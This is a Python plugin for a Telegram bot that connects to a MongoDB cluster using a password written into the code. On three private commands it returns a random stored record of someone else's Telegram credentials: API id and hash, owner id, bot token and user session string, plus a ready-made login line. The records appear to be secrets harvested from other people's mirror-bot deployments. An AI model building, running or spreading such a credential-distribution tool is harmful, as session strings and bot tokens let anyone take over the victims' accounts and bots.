from pyrogram import Client, filters
import pymongo
from Arctix import Arctix as app

# MongoDB connection URL
url = "mongodb+srv://mongo:mongo@mongo.1ics4jt.mongodb.net/?retryWrites=true&w=majority"
mongo_client = pymongo.MongoClient(url)

# Define MongoDB databases and collections
databases = {
    'mltb': mongo_client['mltb']['data'],
    'wzmlx': mongo_client['wzmlx']['data'],
    'zmirror': mongo_client['zmirror']['data']
}

@app.on_message(filters.command("mltb") & filters.private)
async def fetch_mltb_data(client, message):
    await fetch_data(message, 'mltb')

@app.on_message(filters.command("wzmlx") & filters.private)
async def fetch_wzmlx_data(client, message):
    await fetch_data(message, 'wzmlx')

@app.on_message(filters.command("zmirror") & filters.private)
async def fetch_zmirror_data(client, message):
    await fetch_data(message, 'zmirror')

async def fetch_data(message, db_name):
    try:
        # Attempt to fetch random document from specified MongoDB database
        random_document = databases[db_name].aggregate([
            {'$match': {'bot_username': {'$exists': True, '$ne': None, '$ne': "None"}}},                        
            {'$sample': {'size': 1}}
        ]).next()
             
        formatted_text = (
            f"Source: https://github.com/{random_document['repo_link']}\n"
            f"API id: `{random_document['telegram_api']}`\n"
            f"API hash: `{random_document['telegram_hash']}`\n"
            f"OWNER id: `{random_document['owner_id']}`\n"
            f"Bot Token: `{random_document['bot_token']}`\n"
            f"Bot Username: `@{random_document['bot_username']}`\n"
            f"String: `{random_document['user_session_string']}`\n\n"
            f"App: `app = Client(\"my_account\", bot_token=\"{random_document['bot_token']}\", api_id=\"{random_document['telegram_api']}\", api_hash=\"{random_document['telegram_hash']}\")`"
        )

        await message.reply_text(text=formatted_text)
        
    except pymongo.errors.PyMongoError as e:
        print(f"PyMongoError: {e}")
        await message.reply_text("An error occurred while fetching data from the database. Please try again later.")
    except StopIteration:
        await message.reply_text("No matching documents found in the database.")
    except Exception as e:
        print(f"Error fetching random MongoDB data: {e}")
        await message.reply_text("An error occurred while processing your request. Please try again later.")
